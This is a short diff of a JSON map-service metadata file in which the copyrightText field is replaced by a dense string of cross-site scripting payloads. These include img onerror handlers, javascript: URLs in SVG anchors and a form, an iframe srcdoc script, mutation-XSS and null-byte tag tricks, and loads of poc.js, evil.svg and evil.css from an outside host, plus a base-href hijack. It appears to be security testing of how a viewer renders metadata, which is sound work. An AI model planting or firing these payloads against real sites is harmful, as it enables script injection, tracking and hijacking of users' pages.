@@ -36,5 +36,5 @@
     "spatialReference": {"wkid": 102100, "latestWkid": 3857}
   },
   "spatialReference": {"wkid": 102100, "latestWkid": 3857},
-  "copyrightText":"AAA<noscript><p title=</noscript><img src=x onerror=alert(1)>>BBB<noembed><img src=x onerror=alert(1)></noembed>CCC<iddddg src=https://ihatedota.com/x?c=imgsrctesttttc=def>DDD<a href=https://ihatedota.com/x style=background:url('https://ihatedota.com/x?c=cssbg')>e</a>EEE<svg><use href=https://ihatedota.com/evil.svg#x/></svg>FFF<a href=https://ihatedota.com/x rel=noreferrer style=color:red yerrrr=abcccc>GGGG"
+  "copyrightText":"ddAAA<%00script=\"https://ihatedota.com/poc.js\">abs link</a>BBB<a style=\"color:red\">style attr</a>CCC<a target=\"_blank\">target attr</a>DDD<svg><a href=\"javascript:alert(1)\"><text>x</text></a></svg>EEE<svg><a xlink:href=\"javascript:alert(1)\"><text>x</text></a></svg>FFF<form action=\"javascript:alert(1)\"><input type=submit></form>GGG<iframe srcdoc=\"<script>alert(1)<\/script>\"></iframe>HHH<sc%00ript=\"https://x.com\testt.js\" ping=\"https://ihatedota.com/x\">ping</a>III<math><mtext><table><mglyph><style><!--</style></mtext><img src onerror=alert(1)></math>JJJ<base href=\"https://ihatedota.com/\">KKK<link rel=stylesheet href=\"https://ihatedota.com/evil.css\">LG"
 }
